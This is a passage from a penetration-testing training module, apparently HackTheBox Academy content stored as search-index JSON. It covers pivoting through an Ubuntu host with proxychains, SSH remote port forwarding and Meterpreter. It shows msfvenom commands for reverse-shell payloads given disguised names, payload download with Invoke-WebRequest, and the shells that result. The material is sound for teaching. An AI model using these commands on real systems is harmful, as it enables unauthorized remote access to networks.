configuration file located at <code>/etc/proxychains.conf</code>. We can add <code>socks4 127.0.0.1 9050</code> to the last line if it is not already there.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#checking-etcproxychainsconf","title":"Checking /etc/proxychains.conf","text":"<p>Checking /etc/proxychains.conf</p> <pre><code>darkinga@htb[/htb]$ tail -4 /etc/proxychains.conf\n\n# meanwile\n# defaults set to \"tor\"\nsocks4  127.0.0.1 9050\n</code></pre> <p>Now when you start Nmap with proxychains using the below command, it will route all the packets of Nmap to the local port 9050, where our SSH client is listening, which will forward all the packets over SSH to the 172.16.5.0/23 network.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#using-nmap-with-proxychains","title":"Using Nmap with Proxychains","text":"<p>Using Nmap with Proxychains</p> <pre><code>darkinga@htb[/htb]$ proxychains nmap -v -sn 172.16.5.1-200\n\nProxyChains-3.1 (http://proxychains.sf.net)\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:30 EST\nInitiating Ping Scan at 12:30\nScanning 10 hosts [2 ports/host]\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.2:80-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.5:80-&lt;&gt;&lt;&gt;-OK\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.6:80-&lt;--timeout\nRTTVAR has grown to over 2.3 seconds, decreasing to 2.0\n\n&lt;SNIP&gt;\n</code></pre> <p>This part of packing all your Nmap data using proxychains and forwarding it to a remote server is called <code>SOCKS tunneling</code>. One more important note to remember here is that we can only perform a <code>full TCP connect scan</code> over proxychains. The reason for this is that proxychains cannot understand partial packets. If you send partial packets like half connect scans, it will return incorrect results. We also need to make sure we are aware of the fact that <code>host-alive</code> checks may not work against Windows targets because the Windows Defender firewall blocks ICMP requests (traditional pings) by default.</p> <p>A full TCP connect scan without ping on an entire network range will take a long time. So, for this module, we will primarily focus on scanning individual hosts, or smaller ranges of hosts we know are alive, which in this case will be a Windows host at <code>172.16.5.19</code>.</p> <p>We will perform a remote system scan using the below command.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#enumerating-the-windows-target-through-proxychains","title":"Enumerating the Windows Target through Proxychains","text":"<p>Enumerating the Windows Target through Proxychains</p> <pre><code>darkinga@htb[/htb]$ proxychains nmap -v -Pn -sT 172.16.5.19\n\nProxyChains-3.1 (http://proxychains.sf.net)\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:33 EST\nInitiating Parallel DNS resolution of 1 host. at 12:33\nCompleted Parallel DNS resolution of 1 host. at 12:33, 0.15s elapsed\nInitiating Connect Scan at 12:33\nScanning 172.16.5.19 [1000 ports]\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:1720-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:587-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:445-&lt;&gt;&lt;&gt;-OK\nDiscovered open port 445/tcp on 172.16.5.19\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:8080-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:23-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:135-&lt;&gt;&lt;&gt;-OK\nDiscovered open port 135/tcp on 172.16.5.19\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:110-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:21-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:554-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-1172.16.5.19:25-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:5900-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:1025-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:143-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:199-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:993-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:995-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:3389-&lt;&gt;&lt;&gt;-OK\nDiscovered open port 3389/tcp on 172.16.5.19\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:443-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:80-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:113-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:8888-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:139-&lt;&gt;&lt;&gt;-OK\nDiscovered open port 139/tcp on 172.16.5.19\n</code></pre> <p>The Nmap scan shows several open ports, one of which is <code>RDP port</code> (3389). Similar to the Nmap scan, we can also pivot <code>msfconsole</code> via proxychains to perform vulnerable RDP scans using Metasploit auxiliary modules. We can start msfconsole with proxychains.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#using-metasploit-with-proxychains","title":"Using Metasploit with Proxychains","text":"<p>We can also open Metasploit using proxychains and send all associated traffic through the proxy we have established.</p> <p>Enumerating the Windows Target through Proxychains</p> <pre><code>darkinga@htb[/htb]$ proxychains msfconsole\n\nProxyChains-3.1 (http://proxychains.sf.net)\n\n\n     .~+P``````-o+:.                                      -o+:.\n.+oooyysyyssyyssyddh++os-`````                        ```````````````          `\n+++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o\n++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy\n--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///\n                                `...............`              `...-/////...`\n\n\n                                  .::::::::::-.                     .::::::-\n                                .hmMMMMMMMMMMNddds\\...//M\\\\.../hddddmMMMMMMNo\n                                 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&amp;&amp;MMMMMMMMMMMMMMy\n                                 .sm/`-yMMMMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMMMMh`\n                                  -Nd`  :MMMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMMMh`\n                                   -Nh` .yMMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMMm/\n    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMm/\n      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMd\n    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/\n    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:\n          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+\n          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\\\.^^`:++:^^o://^^^\\\\`::\n          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||\n........../yddy/:...+hmo-...hdd:............\\\\=v=//............\\\\=v=//.........\n================================================================================\n=====================+--------------------------------+=========================\n=====================| Session one died of dysentery. |=========================\n=====================+--------------------------------+=========================\n================================================================================\n\n                     Press ENTER to size up the situation\n\n%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%\n%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n\n                        Press SPACE BAR to continue\n\n\n\n       =[ metasploit v6.1.27-dev                          ]\n+ -- --=[ 2196 exploits - 1162 auxiliary - 400 post       ]\n+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]\n+ -- --=[ 9 evasion                                       ]\n\nMetasploit tip: Adapter names can be used for IP params \nset LHOST eth0\n\nmsf6 &gt; \n</code></pre> <p>Let's use the <code>rdp_scanner</code> auxiliary module to check if the host on the internal network is listening on 3389.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#using-rdp_scanner-module","title":"Using rdp_scanner Module","text":"<p>Using rdp_scanner Module</p> <pre><code>msf6 &gt; search rdp_scanner\n\nMatching Modules\n================\n\n   #  Name                               Disclosure Date  Rank    Check  Description\n   -  ----                               ---------------  ----    -----  -----------\n   0  auxiliary/scanner/rdp/rdp_scanner                   normal  No     Identify endpoints speaking the Remote Desktop Protocol (RDP)\n\n\nInteract with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/rdp/rdp_scanner\n\nmsf6 &gt; use 0\nmsf6 auxiliary(scanner/rdp/rdp_scanner) &gt; set rhosts 172.16.5.19\nrhosts =&gt; 172.16.5.19\nmsf6 auxiliary(scanner/rdp/rdp_scanner) &gt; run\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:3389-&lt;&gt;&lt;&gt;-OK\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:3389-&lt;&gt;&lt;&gt;-OK\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:3389-&lt;&gt;&lt;&gt;-OK\n\n[*] 172.16.5.19:3389      - Detected RDP on 172.16.5.19:3389      (name:DC01) (domain:DC01) (domain_fqdn:DC01) (server_fqdn:DC01) (os_version:10.0.17763) (Requires NLA: No)\n[*] 172.16.5.19:3389      - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre> <p>At the bottom of the output above, we can see the RDP port open with the Windows OS version.</p> <p>Depending on the level of access we have to this host during an assessment, we may try to run an exploit or log in using gathered credentials. For this module, we will log in to the Windows remote host over the SOCKS tunnel. This can be done using <code>xfreerdp</code>. The user in our case is <code>victor,</code> and the password is <code>pass@123</code></p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#using-xfreerdp-with-proxychains","title":"Using xfreerdp with Proxychains","text":"<p>Using xfreerdp with Proxychains</p> <pre><code>darkinga@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123\n\nProxyChains-3.1 (http://proxychains.sf.net)\n[13:02:42:481] [4829:4830] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state\n[13:02:42:482] [4829:4830] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr\n[13:02:42:482] [4829:4830] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd\n[13:02:42:482] [4829:4830] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr\n</code></pre> <p>The xfreerdp command will require an RDP certificate to be accepted before successfully establishing the session. After accepting it, we should have an RDP session, pivoting via the Ubuntu server.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#successful-rdp-pivot","title":"Successful RDP Pivot","text":"<p>Note: When spawning your target, we ask you to wait for 3 - 5 minutes until the whole lab with all the configurations is set up so that the connection to your target works flawlessly.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#remotereverse-port-forwarding-with-ssh","title":"Remote/Reverse Port Forwarding with SSH","text":"<p>We have seen local port forwarding, where SSH can listen on our local host and forward a service on the remote host to our port, and dynamic port forwarding, where we can send packets to a remote network via a pivot host. But sometimes, we might want to forward a local service to the remote port as well. Let's consider the scenario where we can RDP into the Windows host <code>Windows A</code>. As can be seen in the image below, in our previous case, we could pivot into the Windows host via the Ubuntu server.</p> <p></p> <pre><code>But what happens if we try to gain a reverse shell?\n</code></pre> <p>The <code>outgoing connection</code> for the Windows host is only limited to the <code>172.16.5.0/23</code> network. This is because the Windows host does not have any direct connection with the network the attack host is on. If we start a Metasploit listener on our attack host and try to get a reverse shell, we won't be able to get a direct connection here because the Windows server doesn't know how to route traffic leaving its network (172.16.5.0/23) to reach the 10.129.x.x (the Academy Lab network).</p> <p>There are several times during a penetration testing engagement when having just a remote desktop connection is not feasible. You might want to <code>upload</code>/<code>download</code> files (when the RDP clipboard is disabled), <code>use exploits</code> or <code>low-level Windows API</code> using a Meterpreter session to perform enumeration on the Windows host, which is not possible using the built-in Windows executables.</p> <p>In these cases, we would have to find a pivot host, which is a common connection point between our attack host and the Windows server. In our case, our pivot host would be the Ubuntu server since it can connect to both: <code>our attack host</code> and <code>the Windows target</code>. To gain a <code>Meterpreter shell</code> on Windows, we will create a Meterpreter HTTPS payload using <code>msfvenom</code>, but the configuration of the reverse connection for the payload would be the Ubuntu server's host IP address (<code>172.16.5.129</code>). We will use the port 8080 on the Ubuntu server to forward all of our reverse packets to our attack hosts' 8000 port, where our Metasploit listener is running.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#creating-a-windows-payload-with-msfvenom","title":"Creating a Windows Payload with msfvenom","text":"<p>Creating a Windows Payload with msfvenom</p> <pre><code>darkinga@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InteralIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080\n\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 712 bytes\nFinal size of exe file: 7168 bytes\nSaved as: backupscript.exe\n</code></pre>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#configuring-starting-the-multihandler","title":"Configuring &amp; Starting the multi/handler","text":"<p>Configuring &amp; Starting the multi/handler</p> <pre><code>msf6 &gt; use exploit/multi/handler\n\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_https\npayload =&gt; windows/x64/meterpreter/reverse_https\nmsf6 exploit(multi/handler) &gt; set lhost 0.0.0.0\nlhost =&gt; 0.0.0.0\nmsf6 exploit(multi/handler) &gt; set lport 8000\nlport =&gt; 8000\nmsf6 exploit(multi/handler) &gt; run\n\n[*] Started HTTPS reverse handler on https://0.0.0.0:8000\n</code></pre> <p>Once our payload is created and we have our listener configured &amp; running, we can copy the payload to the Ubuntu server using the <code>scp</code> command since we already have the credentials to connect to the Ubuntu server using SSH.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#transferring-payload-to-pivot-host","title":"Transferring Payload to Pivot Host","text":"<p>Transferring Payload to Pivot Host</p> <pre><code>darkinga@htb[/htb]$ scp backupscript.exe ubuntu@&lt;ipAddressofTarget&gt;:~/\n\nbackupscript.exe                                   100% 7168    65.4KB/s   00:00 \n</code></pre> <p>After copying the payload, we will start a <code>python3 HTTP server</code> using the below command on the Ubuntu server in the same directory where we copied our payload.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#starting-python3-webserver-on-pivot-host","title":"Starting Python3 Webserver on Pivot Host","text":"<p>Starting Python3 Webserver on Pivot Host</p> <pre><code>ubuntu@Webserver$ python3 -m http.server 8123\n</code></pre>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#downloading-payload-from-windows-target","title":"Downloading Payload from Windows Target","text":"<p>We can download this <code>backupscript.exe</code> from the Windows host via a web browser or the PowerShell cmdlet <code>Invoke-WebRequest</code>.</p> <p>Downloading Payload from Windows Target</p> <pre><code>PS C:\\Windows\\system32&gt; Invoke-WebRequest -Uri \"http://172.16.5.129:8123/backupscript.exe\" -OutFile \"C:\\backupscript.exe\"\n</code></pre> <p>Once we have our payload downloaded on the Windows host, we will use <code>SSH remote port forwarding</code> to forward our msfconsole's listener service on port 8000 to the Ubuntu server's port 8080. We will use <code>-vN</code> argument in our SSH command to make it verbose and ask it not to prompt the login shell. The <code>-R</code> command asks the Ubuntu server to listen on <code>&lt;targetIPaddress&gt;:8080</code> and forward all incoming connections on port <code>8080</code> to our msfconsole listener on <code>0.0.0.0:8000</code> of our <code>attack host</code>.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#using-ssh-r","title":"Using SSH -R","text":"<p>Using SSH -R</p> <pre><code>darkinga@htb[/htb]$ ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:8000 ubuntu@&lt;ipAddressofTarget&gt; -vN\n</code></pre> <p>After creating the SSH remote port forward, we can execute the payload from the Windows target. If the payload is executed as intended and attempts to connect back to our listener, we can see the logs from the pivot on the pivot host.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#viewing-the-logs-from-the-pivot","title":"Viewing the Logs from the Pivot","text":"<p>Viewing the Logs from the Pivot</p> <pre><code>ebug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355\ndebug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5\ndebug1: channel 1: new [172.16.5.19]\ndebug1: confirm forwarded-tcpip\ndebug1: channel 0: free: 172.16.5.19, nchannels 2\ndebug1: channel 1: connected to 0.0.0.0 port 8000\ndebug1: channel 1: free: 172.16.5.19, nchannels 1\ndebug1: client_input_channel_open: ctype forwarded-tcpip rchan 2 win 2097152 max 32768\ndebug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61356\ndebug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=4\ndebug1: channel 0: new [172.16.5.19]\ndebug1: confirm forwarded-tcpip\ndebug1: channel 0: connected to 0.0.0.0 port 8000\n</code></pre> <p>If all is set up properly, we will receive a Meterpreter shell pivoted via the Ubuntu server.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#meterpreter-session-established","title":"Meterpreter Session Established","text":"<p>Meterpreter Session Established</p> <pre><code>[*] Started HTTPS reverse handler on https://0.0.0.0:8000\n[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!\n[*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...\n[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!\n[*] Meterpreter session 1 opened (127.0.0.1:8000 -&gt; 127.0.0.1 ) at 2022-03-02 10:48:10 -0500\n\nmeterpreter &gt; shell\nProcess 3236 created.\nChannel 1 created.\nMicrosoft Windows [Version 10.0.17763.1637]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\&gt;\n</code></pre> <p>Our Meterpreter session should list that our incoming connection is from a local host itself (<code>127.0.0.1</code>) since we are receiving the connection over the <code>local SSH socket</code>, which created an <code>outbound</code> connection to the Ubuntu server. Issuing the <code>netstat</code> command can show us that the incoming connection is from the SSH service.</p> <p>The below graphical representation provides an alternative way to understand this technique.</p> <p></p> <p>In addition to answering the challenge questions, practice this technique and try to obtain a reverse shell from the Windows target.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#meterpreter-tunneling-port-forwarding","title":"Meterpreter Tunneling &amp; Port Forwarding","text":"<p>Now let us consider a scenario where we have our Meterpreter shell access on the Ubuntu server (the pivot host), and we want to perform enumeration scans through the pivot host, but we would like to take advantage of the conveniences that Meterpreter sessions bring us. In such cases, we can still create a pivot with our Meterpreter session without relying on SSH port forwarding. We can create a Meterpreter shell for the Ubuntu server with the below command, which will return a shell on our attack host on port <code>8080</code>.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#creating-payload-for-ubuntu-pivot-host","title":"Creating Payload for Ubuntu Pivot Host","text":"<p>Creating Payload for Ubuntu Pivot Host</p> <pre><code>darkinga@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080\n\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 130 bytes\nFinal size of elf file: 250 bytes\nSaved as: backupjob\n</code></pre> <p>Before copying the payload over, we can start a multi/handler, also known as a Generic Payload Handler.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#configuring-starting-the-multihandler_1","title":"Configuring &amp; Starting the multi/handler","text":"<p>Configuring &amp; Starting the multi/handler</p> <pre><code>msf6 &gt; use exploit/multi/handler\n\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) &gt; set lhost 0.0.0.0\nlhost =&gt; 0.0.0.0\nmsf6 exploit(multi/handler) &gt; set lport 8080\nlport =&gt; 8080\nmsf6 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp\npayload =&gt; linux/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) &gt; run\n[*] Started reverse TCP handler on 0.0.0.0:8080 \n</code></pre> <p>We can copy the <code>backupjob</code> binary file to the Ubuntu pivot host <code>over SSH</code> and execute it to gain a Meterpreter session.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#executing-the-payload-on-the-pivot-host","title":"Executing the Payload on the Pivot Host","text":"<p>Executing the Payload on the Pivot Host</p> <pre><code>ubuntu@WebServer:~$ ls\n\nbackupjob\nubuntu@WebServer:~$ chmod +x backupjob \nubuntu@WebServer:~$ ./backupjob\n</code></pre> <p>We need to make sure the Meterpreter session is successfully established upon executing the payload.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#meterpreter-session-establishment","title":"Meterpreter Session Establishment","text":"<p>Meterpreter Session Establishment</p> <pre><code>[*] Sending stage (3020772 bytes) to 10.129.202.64\n[*] Meterpreter session 1 opened (10.10.14.18:8080 -&gt; 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500\nmeterpreter &gt; pwd\n\n/home/ubuntu\n</code></pre> <p>We know that the Windows target is on the 172.16.5.0/23 network. So assuming that the firewall on the Windows target is allowing ICMP requests, we would want to perform a ping sweep on this network. We can do that using Meterpreter with the <code>ping_sweep</code> module, which will generate the ICMP traffic from the Ubuntu host to the network <code>172.16.5.0/23</code>.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#ping-sweep","title":"Ping Sweep","text":"<p>Ping Sweep</p> <pre><code>meterpreter &gt; run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23\n\n[*] Performing ping sweep for IP range 172.16.5.0/23\n</code></pre> <p>We could also perform a ping sweep using a <code>for loop</code> directly on a target pivot host that will ping any device in the network range we specify. Here are two helpful ping sweep for loop one-liners we could use for 